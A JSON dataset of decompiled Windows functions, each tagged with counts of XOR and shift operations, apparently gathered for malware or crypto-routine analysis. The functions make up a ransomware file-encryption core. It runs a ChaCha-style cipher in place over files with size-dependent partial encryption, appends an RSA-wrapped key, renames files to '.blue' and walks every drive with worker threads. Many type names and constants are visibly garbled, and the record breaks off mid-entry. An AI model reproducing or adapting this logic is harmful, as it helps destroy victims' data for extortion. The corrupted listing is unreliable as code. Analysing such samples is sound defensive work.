[
    {
        "Function": "sub_40321A",
        "Total XOR and shift operations": 16,
        "XOR operations": 0,
        "Shift operations": 16,
        "Operation percentage": "76.19%",
        "Function Body": "\nint __fastcall sub_40321A(_DWORD *a1, unsigned __int8 *a2)\n{\n  int result; // eax\n  int v4; // ecx\n\n  a1[4] = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);\n  a1[5] = a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8);\n  a1[6] = a2[8] | ((a2[9] | (*((unsigned __int16 *)a2 + 5) << 8)) << 8);\n  a1[7] = a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8);\n  a1[8] = a2[16] | ((a2[17] | (*((unsigned __int16 *)a2 + 9) << 8)) << 8);\n  a1[9] = a2[20] | ((a2[21] | (*((unsigned __int16 *)a2 + 11) << 8)) << 8);\n  a1[10] = a2[24] | ((a2[25] | (*((unsigned __int16 *)a2 + 13) << 8)) << 8);\n  result = a2[28];\n  v4 = result | ((a2[29] | (*((unsigned __int16 *)a2 + 15) << 8)) << 8);\n  qmemcpy(a1, \"expand 32-byte k\", 16);\n  a1[11] = v4;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_403E89",
        "Total XOR and shift operations": 32,
        "XOR operations": 32,
        "Shift operations": 0,
        "Operation percentage": "21.19%",
        "Function Body": "\nint __fastcall sub_403E89(int a1, __m128i *a2)\n{\n  __m128i v2; // xmm0\n  __int32 v3; // edi\n  __int32 v4; // ebx\n  __int32 v5; // ecx\n  __int32 v6; // eax\n  __int32 v7; // eax\n  int v8; // edx\n  int v9; // esi\n  int v10; // edx\n  int v11; // esi\n  int v12; // edx\n  int v13; // esi\n  int v14; // edi\n  int v15; // ebx\n  int v16; // edx\n  int v17; // esi\n  int v18; // ebx\n  int v19; // ecx\n  int v20; // esi\n  int v21; // ecx\n  int v22; // edi\n  int v23; // ecx\n  int v24; // ebx\n  int v25; // ecx\n  int v26; // ebx\n  bool v27; // zf\n  int v28; // esi\n  int result; // eax\n  __int8 v30; // cl\n  __int32 v31; // edx\n  int v34; // [esp+10h] [ebp-7Ch]\n  int v35; // [esp+14h] [ebp-78h]\n  int v36; // [esp+18h] [ebp-74h]\n  int v37; // [esp+1Ch] [ebp-70h]\n  int v38; // [esp+20h] [ebp-6Ch]\n  int v39; // [esp+24h] [ebp-68h]\n  int v40; // [esp+28h] [ebp-64h]\n  __m128i v41; // [esp+2Ch] [ebp-60h]\n  __m128i v42; // [esp+3Ch] [ebp-50h]\n  __m128i v43; // [esp+4Ch] [ebp-40h]\n  __m128i v44; // [esp+5Ch] [ebp-30h]\n  int v45; // [esp+6Ch] [ebp-20h]\n  int v46; // [esp+70h] [ebp-1Ch]\n  unsigned int v47; // [esp+74h] [ebp-18h]\n  unsigned int v48; // [esp+78h] [ebp-14h]\n  unsigned int v49; // [esp+7Ch] [ebp-10h]\n  int v50; // [esp+80h] [ebp-Ch]\n  int v51; // [esp+84h] [ebp-8h]\n  unsigned int v52; // [esp+88h] [ebp-4h]\n\n  v2 = *a2;\n  v45 = 4;\n  v41 = v2;\n  v42 = a2[1];\n  v3 = v42.m128i_i32[2];\n  v43 = a2[2];\n  v44 = a2[3];\n  v4 = v44.m128i_i32[3];\n  v5 = v44.m128i_i32[0];\n  v49 = v44.m128i_u32[2];\n  v51 = v44.m128i_i32[1];\n  v50 = v42.m128i_i32[3];\n  v48 = v42.m128i_u32[1];\n  v6 = v42.m128i_i32[0];\n  v52 = v42.m128i_i32[0];\n  do\n  {\n    v7 = v41.m128i_i32[0] + v6;\n    v8 = __ROL4__(v5 ^ v7, 16);\n    v9 = __ROL4__(v52 ^ (v8 + v43.m128i_i32[0]), 12);\n    v47 = v9 + v7;\n    v46 = __ROL4__(v8 ^ (v9 + v7), 8);\n    v38 = v8 + v43.m128i_i32[0] + v46;\n    v36 = __ROL4__(v9 ^ v38, 7);\n    v10 = __ROL4__(v51 ^ (v41.m128i_i32[1] + v48), 16);\n    v11 = __ROL4__(v48 ^ (v10 + v43.m128i_i32[1]), 12);\n    v51 = v11 + v41.m128i_i32[1] + v48;\n    v39 = __ROL4__(v10 ^ v51, 8);\n    v34 = v10 + v43.m128i_i32[1] + v39;\n    v52 = __ROL4__(v11 ^ v34, 7);\n    v12 = __ROL4__(v49 ^ (v3 + v41.m128i_i32[2]), 16);\n    v13 = __ROL4__(v3 ^ (v12 + v43.m128i_i32[2]), 12);\n    v40 = v13 + v3 + v41.m128i_i32[2];\n    v35 = __ROL4__(v12 ^ v40, 8);\n    v14 = v35 + v12 + v43.m128i_i32[2];\n    v49 = __ROL4__(v13 ^ v14, 7);\n    v15 = __ROL4__((v50 + v41.m128i_i32[3]) ^ v4, 16);\n    v16 = __ROL4__(v50 ^ (v15 + v43.m128i_i32[3]), 12);\n    v37 = v16 + v50 + v41.m128i_i32[3];\n    v17 = __ROL4__(v15 ^ v37, 8);\n    v18 = v17 + v15 + v43.m128i_i32[3];\n    v50 = __ROL4__(v16 ^ v18, 7);\n    v19 = __ROL4__(v17 ^ (v47 + v52), 16);\n    v20 = __ROL4__(v52 ^ (v19 + v14), 12);\n    v41.m128i_i32[0] = v20 + v47 + v52;\n    v47 = __ROL4__(v19 ^ v41.m128i_i32[0], 8);\n    v43.m128i_i32[2] = v19 + v14 + v47;\n    v48 = __ROL4__(v20 ^ v43.m128i_i32[2], 7);\n    v21 = __ROL4__(v46 ^ (v49 + v51), 16);\n    v22 = __ROL4__(v49 ^ (v21 + v18), 12);\n    v41.m128i_i32[1] = v22 + v49 + v51;\n    v46 = __ROL4__(v21 ^ v41.m128i_i32[1], 8);\n    v44.m128i_i32[0] = v46;\n    v43.m128i_i32[3] = v21 + v18 + v46;\n    v3 = __ROL4__(v43.m128i_i32[3] ^ v22, 7);\n    v23 = __ROL4__(v39 ^ (v50 + v40), 16);\n    v24 = __ROL4__(v50 ^ (v23 + v38), 12);\n    v41.m128i_i32[2] = v24 + v50 + v40;\n    v51 = __ROL4__(v23 ^ v41.m128i_i32[2], 8);\n    v44.m128i_i32[1] = v51;\n    v43.m128i_i32[0] = v23 + v38 + v51;\n    v25 = __ROL4__(v35 ^ (v36 + v37), 16);\n    v50 = __ROL4__(v43.m128i_i32[0] ^ v24, 7);\n    v42.m128i_i32[3] = v50;\n    v26 = __ROL4__(v36 ^ (v25 + v34), 12);\n    v41.m128i_i32[3] = v26 + v36 + v37;\n    v49 = __ROL4__(v25 ^ v41.m128i_i32[3], 8);\n    v44.m128i_i64[1] = __PA504B__(v47, v49);\n    v43.m128i_i32[1] = v25 + v34 + v49;\n    v52 = __ROL4__(v43.m128i_i32[1] ^ v26, 7);\n    v42.m128i_i64[0] = __PA504B__(v48, v52);\n    v27 = v45-- == 1;\n    v4 = v47;\n    v6 = v52;\n    v5 = v46;\n  }\n  while ( !v27 );\n  v28 = 0;\n  v42.m128i_i32[2] = v3;\n  v41 = _mm_add_epi32(v41, *a2);\n  v42 = _mm_add_epi32(a2[1], v42);\n  v43 = _mm_add_epi32(a2[2], v43);\n  result = a1 + 2;\n  v44 = _mm_add_epi32(a2[3], v44);\n  do\n  {\n    v30 = v41.m128i_i8[4 * v28];\n    result += 4;\n    v31 = v41.m128i_i32[v28++];\n    *(_WORD *)(result - 6) = __PAD667__(BYTE1(v31), v30);\n    *(_BYTE *)(result - 4) = BYTE2(v31);\n    *(_BYTE *)(result - 3) = HI2280(v31);\n  }\n  while ( v28 < 16 );\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_40A65F",
        "Total XOR and shift operations": 10,
        "XOR operations": 1,
        "Shift operations": 9,
        "Operation percentage": "9.90%",
        "Function Body": "\nint __fastcall sub_40A65F(HA0019 hFile, unsigned __int8 *a2, unsigned __int8 *a3)\n{\n  DWORD FileSize; // eax\n  __int64 v6; // rax\n  int v7; // ecx\n  int v8; // eax\n  int v9; // ecx\n  int v10; // eax\n  void (__stdcall *v11)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD); // esi\n  int v12; // eax\n  BOOL (__stdcall *v13)(HA0019, LP7C62, DWORD, LP2D69D, LP846ELACA71); // ecx\n  __int64 v14; // rdi\n  unsigned int v15; // eax\n  unsigned int v16; // eax\n  LARGE_INC4CBR v18; // [esp-10h] [ebp-8Ch]\n  LARGE_INC4CBR v19; // [esp-10h] [ebp-8Ch]\n  unsigned int v20; // [esp+18h] [ebp-64h]\n  unsigned int v21; // [esp+1Ch] [ebp-60h]\n  int liDistanceToMove_4; // [esp+24h] [ebp-58h]\n  __m128i v23[3]; // [esp+28h] [ebp-54h] BYREF\n  int v24; // [esp+58h] [ebp-24h]\n  int v25; // [esp+5Ch] [ebp-20h]\n  int v26; // [esp+60h] [ebp-1Ch]\n  int v27; // [esp+64h] [ebp-18h]\n  DWORD NumberOfBytesWritten; // [esp+68h] [ebp-14h] BYREF\n  DWORD FileSizeHigh; // [esp+6Ch] [ebp-10h] BYREF\n  DWORD NumberOfBytesRead; // [esp+70h] [ebp-Ch] BYREF\n\n  FileSizeHigh = 0;\n  FileSize = GetFileSize(hFile, &FileSizeHigh);\n  v6 = (__int64)(__PA504B__(FileSizeHigh, FileSize) - 110FB2480) / 2;\n  v20 = HIED92D(v6);\n  v21 = v6;\n  sub_40321A(v23, a2);\n  v7 = *((unsigned __int16 *)a3 + 1);\n  v24 = 0;\n  v8 = a3[1];\n  v25 = 0;\n  v9 = *a3 | ((v8 | (v7 << 8)) << 8);\n  v10 = a3[6];\n  v26 = v9;\n  v11 = (void (__stdcall *)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD))SetFilePointerEx;\n  v27 = a3[4] | ((a3[5] | ((v10 | (a3[7] << 8)) << 8)) << 8);\n  SetFilePointerEx(hFile, 0i64, 0, 0);\n  v12 = 0;\n  liDistanceToMove_4 = 0;\nLABEL_2:\n  v13 = ReadFile;\n  if ( v12 == 2 )\n  {\n    while ( v13(hFile, stru_41D2F3, 0x10000u, &NumberOfBytesRead, 0) )\n    {\n      sub_40C598(v23, stru_41D2F3, NumberOfBytesRead);\n      v19.HighPart = -(NumberOfBytesRead != 0);\n      v19.LowPart = -NumberOfBytesRead;\n      v11(hFile, v19, 0, 1u);\n      if ( !WriteFile(hFile, stru_41D2F3, NumberOfBytesRead, &NumberOfBytesWritten, 0) )\n        break;\n      v13 = ReadFile;\n      if ( NumberOfBytesRead < 0x10000 )\n        return 0;\n    }\n  }\n  else\n  {\n    v14 = 0i64;\n    while ( v13(hFile, stru_41D2F3, 0x10000u, &NumberOfBytesRead, 0) )\n    {\n      sub_40C598(v23, stru_41D2F3, NumberOfBytesRead);\n      v18.HighPart = -(NumberOfBytesRead != 0);\n      v18.LowPart = -NumberOfBytesRead;\n      SetFilePointerEx(hFile, v18, 0, 1u);\n      if ( !WriteFile(hFile, stru_41D2F3, NumberOfBytesRead, &NumberOfBytesWritten, 0) )\n        break;\n      v15 = NumberOfBytesRead + v14;\n      v14 += NumberOfBytesRead;\n      v13 = ReadFile;\n      if ( (((unsigned __int64)(v14 + 0x10000) >> 32) & 0x80C41300) == 0i64\n        && (!(((((unsigned __int64)(v14 + 0x10000) >> 32) & 0x80C41300) != 0i64) ^ __OFADD__(\n                                                                                     v15 >= 0xFF476D00,\n                                                                                     HIED92D(v14)) | ((unsigned __int64)(v14 + 0x10000) >> 32 == 0))\n         || (unsigned int)(v14 + 0x10000) > 0x23E2670) )\n      {\n        v16 = (v14 + __PA504B__(v20, v21)) >> 32;\n        v11 = (void (__stdcall *)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD))SetFilePointerEx;\n        SetFilePointerEx(hFile, (LARGE_INC4CBR)(__PA504B__(v16, (unsigned int)v14 + v21) - 362F7F24), 0, 1u);\n        v12 = liDistanceToMove_4 + 1;\n        liDistanceToMove_4 = v12;\n        if ( v12 >= 3 )\n          return 0;\n        goto LABEL_2;\n      }\n    }\n  }\n  return -1;\n}\n// 41D2F3: using guessed type __m128i stru_41D2F3[4096];\n// 40A65F: using guessed type __m128i var_54[3];\n\n"
    },
    {
        "Function": "sub_40453D",
        "Total XOR and shift operations": 13,
        "XOR operations": 0,
        "Shift operations": 13,
        "Operation percentage": "7.39%",
        "Function Body": "\nint __usercall sub_40453D@<eax>(HCFBDFKEY a1@<edx>, LPB7EAR lpFileName, unsigned __int8 *a3, unsigned __int8 *a4)\n{\n  HA0019 FileW; // ebx\n  DWORD FileSize; // eax\n  int v7; // esi\n  int v8; // eax\n  WCHAR *v9; // esi\n  size_t v10; // eax\n  size_t v11; // eax\n  int v12; // ecx\n  int v13; // ecx\n  int v14; // eax\n  void (__stdcall *v15)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD); // edi\n  DWORD v16; // esi\n  unsigned __int8 *v17; // esi\n  int v18; // ecx\n  int v19; // ecx\n  int v20; // eax\n  _DWORD *v21; // eax\n  int v22; // ecx\n  int v23; // esi\n  WCHAR *v24; // edi\n  LARGE_INC4CBR v25; // [esp-10h] [ebp-9Ch]\n  LARGE_INC4CBR v26; // [esp-10h] [ebp-9Ch]\n  int v27; // [esp-4h] [ebp-90h]\n  const WCHAR *lpNewFileName; // [esp+18h] [ebp-74h]\n  void *lpBuffer; // [esp+2Ch] [ebp-60h]\n  __m128i v31[3]; // [esp+30h] [ebp-5Ch] BYREF\n  int v32; // [esp+60h] [ebp-2Ch]\n  int v33; // [esp+64h] [ebp-28h]\n  int v34; // [esp+68h] [ebp-24h]\n  int v35; // [esp+6Ch] [ebp-20h]\n  DWORD NumberOfBytesWritten; // [esp+74h] [ebp-18h] BYREF\n  DWORD FileSizeHigh; // [esp+78h] [ebp-14h] BYREF\n  DWORD v38; // [esp+7Ch] [ebp-10h] BYREF\n  DWORD NumberOfBytesRead; // [esp+80h] [ebp-Ch] BYREF\n\n  FileW = CreateFileW(lpFileName, 0xC0C82900, 1u, 0, 3u, 0x80u, 0);\n  FileSizeHigh = 0;\n  FileSize = GetFileSize(FileW, &FileSizeHigh);\n  v38 = FileSizeHigh;\n  NumberOfBytesRead = FileSize;\n  if ( FileW == (HA0019)-1 )\n    return -1;\n  v7 = lstrlenW(lpFileName);\n  v8 = lstrlenW(L\".blue\");\n  v9 = (WCHAR *)calloc(__CFADD__(v8 + v7, 2) ? -1 : v8 + v7 + 2, 2u);\n  lpNewFileName = v9;\n  if ( v9 )\n  {\n    v27 = lstrlenW(lpFileName);\n    v10 = _msize(v9);\n    wcsncpy_s(v9, v10 >> 1, lpFileName, v27);\n    v11 = _msize(v9);\n    wcscat_s(v9, v11 >> 1, L\".blue\");\n    if ( (v38 & 0x80C41300) == 0 )\n    {\n      if ( (int)v38 > 0 )\n        goto LABEL_16;\n      if ( NumberOfBytesRead >= 0xA0EA56 )\n      {\n        if ( NumberOfBytesRead < 0x64D6DE0 )\n        {\n          v38 = GetFileSize(FileW, 0) >> 1;\n          sub_40321A(v31, a3);\n          v12 = a4[1] | (*((unsigned __int16 *)a4 + 1) << 8);\n          v32 = 0;\n          v13 = *a4 | (v12 << 8);\n          v33 = 0;\n          v14 = a4[6];\n          v34 = v13;\n          v15 = (void (__stdcall *)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD))SetFilePointerEx;\n          v35 = a4[4] | ((a4[5] | ((v14 | (a4[7] << 8)) << 8)) << 8);\n          SetFilePointerEx(FileW, 0i64, 0, 0);\n          v16 = 0;\n          if ( ReadFile(FileW, stru_44E142, 0x10000u, &NumberOfBytesRead, 0) )\n          {\n            do\n            {\n              sub_40C598(v31, stru_44E142, NumberOfBytesRead);\n              v25.HighPart = -(NumberOfBytesRead != 0);\n              v25.LowPart = -NumberOfBytesRead;\n              SetFilePointerEx(FileW, v25, 0, 1u);\n              if ( !WriteFile(FileW, stru_44E142, NumberOfBytesRead, &NumberOfBytesWritten, 0) )\n                break;\n              v16 += NumberOfBytesRead;\n              if ( v16 > v38 )\n                break;\n            }\n            while ( NumberOfBytesRead >= 0x10000 && ReadFile(FileW, stru_44E142, 0x10000u, &NumberOfBytesRead, 0) );\n          }\nLABEL_21:\n          v17 = a3;\n          goto LABEL_22;\n        }\n        if ( NumberOfBytesRead < 0x3E80C413 )\n        {\n          v17 = a3;\n          sub_40C6E3(FileW, a3, a4);\n          v15 = (void (__stdcall *)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD))SetFilePointerEx;\nLABEL_22:\n          v15(FileW, 0i64, 0, 2u);\n          v21 = calloc(0x20Cu, 1u);\n          v38 = 0;\n          lpBuffer = v21;\n          NumberOfBytesRead = 264;\n          if ( v21 )\n          {\n            qmemcpy(v21, v17, 0x100u);\n            v22 = *((_DWORD *)a4 + 1);\n            v21[64] = *(_DWORD *)a4;\n            v21[65] = v22;\n            if ( CryptEncrypt(a1, 0, 1, 0, (BYTE *)v21, &NumberOfBytesRead, 0x20Cu) )\n              WriteFile(FileW, lpBuffer, NumberOfBytesRead, &v38, 0);\n            j___free_base(lpBuffer);\n          }\n          v23 = 0;\n          goto LABEL_28;\n        }\nLABEL_16:\n        v17 = a3;\n        sub_40A65F(FileW, a3, a4);\n        v15 = (void (__stdcall *)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD))SetFilePointerEx;\n        goto LABEL_22;\n      }\n    }\n    sub_40321A(v31, a3);\n    v18 = a4[1] | (*((unsigned __int16 *)a4 + 1) << 8);\n    v32 = 0;\n    v19 = *a4 | (v18 << 8);\n    v33 = 0;\n    v20 = a4[6];\n    v34 = v19;\n    v15 = (void (__stdcall *)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD))SetFilePointerEx;\n    v35 = a4[4] | ((a4[5] | ((v20 | (a4[7] << 8)) << 8)) << 8);\n    SetFilePointerEx(FileW, 0i64, 0, 0);\n    if ( ReadFile(FileW, stru_4355F8, 0x10000u, &NumberOfBytesRead, 0) )\n    {\n      do\n      {\n        sub_40C598(v31, stru_4355F8, NumberOfBytesRead);\n        v26.HighPart = -(NumberOfBytesRead != 0);\n        v26.LowPart = -NumberOfBytesRead;\n        SetFilePointerEx(FileW, v26, 0, 1u);\n      }\n      while ( WriteFile(FileW, stru_4355F8, NumberOfBytesRead, &NumberOfBytesWritten, 0)\n           && NumberOfBytesRead >= 0x10000\n           && ReadFile(FileW, stru_4355F8, 0x10000u, &NumberOfBytesRead, 0) );\n    }\n    goto LABEL_21;\n  }\n  v23 = -1;\nLABEL_28:\n  if ( FileW )\n  {\n    CloseHandle(FileW);\n    v24 = (WCHAR *)lpNewFileName;\n    MoveFileW(lpFileName, lpNewFileName);\n  }\n  else\n  {\n    v24 = (WCHAR *)lpNewFileName;\n  }\n  j___free_base(v24);\n  return v23;\n}\n// 40614C: conditional instruction was optimized away because %var_10.4==0\n// 407AA1: conditional instruction was optimized away because %var_10.4==0\n// 40012B: conditional instruction was optimized away because ecx.4>=0\n// 40E5DC: conditional instruction was optimized away because %var_10.4==0\n// 4355F8: using guessed type __m128i stru_4355F8[4096];\n// 44E142: using guessed type __m128i stru_44E142[4096];\n// 40453D: using guessed type __m128i var_5C[3];\n\n"
    },
    {
        "Function": "sub_40C6E3",
        "Total XOR and shift operations": 8,
        "XOR operations": 0,
        "Shift operations": 8,
        "Operation percentage": "7.14%",
        "Function Body": "\nint __fastcall sub_40C6E3(HA0019 hFile, unsigned __int8 *a2, unsigned __int8 *a3)\n{\n  DWORD FileSize; // eax\n  unsigned __int64 v4; // rax\n  unsigned int v5; // edi\n  __int64 v6; // rax\n  int v7; // ecx\n  int v8; // eax\n  int v9; // ecx\n  int v10; // eax\n  void (__stdcall *v11)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD); // esi\n  int v12; // edx\n  BOOL (__stdcall *v13)(HA0019, LP7C62, DWORD, LP2D69D, LP846ELACA71); // eax\n  unsigned int v14; // edi\n  unsigned int v15; // esi\n  LARGE_INC4CBR v17; // [esp-10h] [ebp-9Ch]\n  unsigned __int64 v18; // [esp-10h] [ebp-9Ch]\n  LARGE_INC4CBR v19; // [esp-10h] [ebp-9Ch]\n  unsigned int v20; // [esp+10h] [ebp-7Ch]\n  unsigned int v21; // [esp+14h] [ebp-78h]\n  int v24; // [esp+2Ch] [ebp-60h]\n  unsigned int v25; // [esp+30h] [ebp-5Ch]\n  DWORD v26; // [esp+34h] [ebp-58h]\n  int v27; // [esp+34h] [ebp-58h]\n  __m128i v28[3]; // [esp+38h] [ebp-54h] BYREF\n  int v29; // [esp+68h] [ebp-24h]\n  int v30; // [esp+6Ch] [ebp-20h]\n  int v31; // [esp+70h] [ebp-1Ch]\n  int v32; // [esp+74h] [ebp-18h]\n  DWORD NumberOfBytesWritten; // [esp+78h] [ebp-14h] BYREF\n  DWORD FileSizeHigh; // [esp+7Ch] [ebp-10h] BYREF\n  DWORD NumberOfBytesRead; // [esp+80h] [ebp-Ch] BYREF\n\n  FileSizeHigh = 0;\n  FileSize = GetFileSize(hFile, &FileSizeHigh);\n  v26 = FileSize;\n  v4 = (__int64)((double)__SPA504B__(FileSizeHigh, FileSize) * 0.169A1666AD926623 / 3.0);\n  v24 = HIED92D(v4);\n  v5 = HIED92D(v4);\n  v25 = v4;\n  HIED92D(v4) = v4 >> 31;\n  v6 = (__int64)(__PA504B__(FileSizeHigh, v26) - (__PA504B__(v5, 2 * (int)v4) + v4)) / 2;\n  v20 = HIED92D(v6);\n  v21 = v6;\n  sub_40321A(v28, a2);\n  v7 = *((unsigned __int16 *)a3 + 1);\n  v8 = a3[1];\n  v29 = 0;\n  v9 = *a3 | ((v8 | (v7 << 8)) << 8);\n  v30 = 0;\n  v10 = a3[6];\n  v31 = v9;\n  v11 = (void (__stdcall *)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD))SetFilePointerEx;\n  v32 = a3[4] | ((a3[5] | ((v10 | (a3[7] << 8)) << 8)) << 8);\n  SetFilePointerEx(hFile, 0i64, 0, 0);\n  v12 = 0;\n  v27 = 0;\n  while ( 1 )\n  {\n    v13 = ReadFile;\n    if ( v12 == 2 )\n      break;\n    if ( v24 >= 0 && (v24 > 0 || v25 >= 0x10000) )\n    {\n      v14 = 0;\n      v15 = 0;\n      while ( v13(hFile, stru_4240A8, 0x10000u, &NumberOfBytesRead, 0) )\n      {\n        sub_40C598(v28, stru_4240A8, NumberOfBytesRead);\n        v17.HighPart = -(NumberOfBytesRead != 0);\n        v17.LowPart = -NumberOfBytesRead;\n        SetFilePointerEx(hFile, v17, 0, 1u);\n        if ( !WriteFile(hFile, stru_4240A8, NumberOfBytesRead, &NumberOfBytesWritten, 0) )\n          break;\n        v14 = (__PA504B__(v14, NumberOfBytesRead) + v15) >> 32;\n        v15 += NumberOfBytesRead;\n        v13 = ReadFile;\n        if ( (int)((__PA504B__(v14, v15) + 0x10000) >> 32) >= v24 )\n          goto LABEL_12;\n      }\n      return -1;\n    }\n    v14 = 0;\n    v15 = 0;\nLABEL_12:\n    v18 = __PA504B__(v20, v21) + __PA504B__(v14, v15) - __PA504B__(v24, v25) + 0x10000;\n    v11 = (void (__stdcall *)(HA0019, LARGE_INC4CBR, PL4414_INC4CBR, DWORD))SetFilePointerEx;\n    SetFilePointerEx(hFile, (LARGE_INC4CBR)v18, 0, 1u);\n    v12 = v27 + 1;\n    v27 = v12;\n    if ( v12 >= 3 )\n      return 0;\n  }\n  while ( v13(hFile, stru_4240A8, 0x10000u, &NumberOfBytesRead, 0) )\n  {\n    sub_40C598(v28, stru_4240A8, NumberOfBytesRead);\n    v19.HighPart = -(NumberOfBytesRead != 0);\n    v19.LowPart = -NumberOfBytesRead;\n    v11(hFile, v19, 0, 1u);\n    if ( !WriteFile(hFile, stru_4240A8, NumberOfBytesRead, &NumberOfBytesWritten, 0) )\n      break;\n    v13 = ReadFile;\n    if ( NumberOfBytesRead < 0x10000 )\n      return 0;\n  }\n  return -1;\n}\n// 4240A8: using guessed type __m128i stru_4240A8[4096];\n// 40C6E3: using guessed type __m128i var_54[3];\n\n"
    },
    {
        "Function": "sub_40C1E7",
        "Total XOR and shift operations": 1,
        "XOR operations": 0,
        "Shift operations": 1,
        "Operation percentage": "3.23%",
        "Function Body": "\nint __cdecl sub_40C1E7(int a1)\n{\n  int *v2; // [esp+4h] [ebp-4h] BYREF\n\n  if ( a1 == -2 )\n  {\n    *__doserrno() = 0;\n    *_errno() = 9;\n  }\n  else\n  {\n    if ( a1 >= 0\n      && a1 < (unsigned int)dword_414D6A\n      && (*(_BYTE *)(dword_41CC43[a1 >> 6] + 48 * (a1 & 0x3F) + 40) & 1) != 0 )\n    {\n      v2 = &a1;\n      return sub_40F926(a1, (int)&v2);\n    }\n    *__doserrno() = 0;\n    *_errno() = 9;\n    _invalid_parameter_noinfo();\n  }\n  return -1;\n}\n// 41CC43: using guessed type int dword_41CC43[128];\n// 414D6A: using guessed type int dword_414D6A;\n\n// nfuncs=389 queued=63 decompiled=63 lumina nreq=0 worse=0 better=0\n// ALL OK, 63 function(s) have been successfully decompiled\n"
    },
    {
        "Function": "sub_40FF74",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "2.44%",
        "Function Body": "\nint __usercall sub_40FF74@<eax>(int a1@<ebp>)\n{\n  DWORD LogicalDriveStringsW; // esi\n  WCHAR *v2; // eax\n  unsigned int v3; // edi\n  HA0019 *v4; // esi\n  const WCHAR *v5; // edi\n  int v6; // eax\n  void *v7; // esi\n  size_t v8; // eax\n  size_t v9; // eax\n  _DWORD *v10; // eax\n  DWORD v11; // eax\n  signed int i; // esi\n  HA0019 *v13; // ecx\n  signed int v14; // edx\n  signed int j; // esi\n  rsize_t v17; // [esp-64h] [ebp-70h]\n  unsigned int v18; // [esp-4Ch] [ebp-58h]\n  unsigned int v19; // [esp-48h] [ebp-54h]\n  WCHAR *v20; // [esp-44h] [ebp-50h]\n  struct _SYCB2F_INFO v21; // [esp-40h] [ebp-4Ch] BYREF\n  int v22; // [esp+0h] [ebp-Ch]\n  int v23; // [esp+4h] [ebp-8h]\n  int retaddr; // [esp+Ch] [ebp+0h]\n\n  v22 = a1;\n  v23 = retaddr;\n  LogicalDriveStringsW = GetLogicalDriveStringsW(0, 0);\n  v2 = (WCHAR *)calloc(__CFADD__(LogicalDriveStringsW, 2) ? -1 : LogicalDriveStringsW + 2, 2u);\n  v20 = v2;\n  if ( v2 )\n  {\n    GetLogicalDriveStringsW(LogicalDriveStringsW, v2);\n    v3 = 0;\n    v19 = 0;\n    v18 = LogicalDriveStringsW - 1;\n    if ( LogicalDriveStringsW == 1 )\n    {\nLABEL_20:\n      j___free_base(v20);\n      return 0;\n    }\n    while ( 1 )\n    {\n      memset(&v21, 0, sizeof(v21));\n      GetNativeSystemInfo(&v21);\n      nCount = v21.dwNumberOfProcessors;\n      v4 = (HA0019 *)calloc(\n                       (unsigned __int64)v21.dwNumberOfProcessors >> 30 != 0 ? -1 : 4 * v21.dwNumberOfProcessors,\n                       1u);\n      if ( !v4 )\n        break;\n      InitializeCriticalSection(&CriticalSection);\n      Block = v4;\n      v5 = &v20[v3];\n      v6 = lstrlenW(v5);\n      v7 = calloc(__CFADD__(v6, 4) ? -1 : v6 + 4, 2u);\n      if ( v7 )\n      {\n        v17 = lstrlenW(v5) - 1;\n        v8 = _msize(v7);\n        wcsncpy_s((wchar_t *)v7, v8 >> 1, v5, v17);\n        v9 = _msize(v7);\n        wcscat_s((wchar_t *)v7, v9 >> 1, L\"\\\\*\");\n        v10 = calloc(8u, 1u);\n        if ( v10 )\n        {\n          *v10 = 0;\n          v10[1] = 0;\n          if ( dword_41FA94 )\n          {\n            *(_DWORD *)(dword_415C13 + 4) = v10;\n            dword_415C13 = *(_DWORD *)(dword_415C13 + 4);\n            *(_DWORD *)dword_415C13 = v7;\n          }\n          else\n          {\n            dword_41FA94 = (int)v10;\n            dword_415C13 = (int)v10;\n            *v10 = v7;\n          }\n        }\n        v11 = nCount;\n        for ( i = 0; i < (int)nCount; v11 = nCount )\n          Block[i++] = CreateThread(0, 0, (LP9604AD_START_RO7EF1E)StartAddress, &Block, 0, 0);\n      }\n      else\n      {\n        v11 = nCount;\n      }\n      WaitForMultipleObjects(v11, Block, 1, 0xFFBDE0FF);\n      DeleteCriticalSection(&CriticalSection);\n      v13 = Block;\n      if ( Block )\n      {\n        v14 = nCount;\n        for ( j = 0; j < v14; ++j )\n        {\n          if ( v13[j] )\n          {\n            CloseHandle(v13[j]);\n            v14 = nCount;\n            v13 = Block;\n          }\n        }\n        j___free_base(v13);\n      }\n      v3 = lstrlenW(v20) + v19 + 1;\n      v19 = v3;\n      if ( v3 >= v18 )\n        goto LABEL_20;\n    }\n    j___free_base(v20);\n  }\n  return -1;\n}\n// 40FF74: could not find valid save-restore pair for ebp\n// 41FA94: using guessed type int dword_41FA94;\n// 415C13: using guessed type int dword_415C13;\n\n"
    },
    {
        "Function": "sub_4028F9",
        "Total XOR and shift operations": 7,
        "XOR operations": 0,
        "Shift operations": 7,
        "Operation percentage": "2.23%",
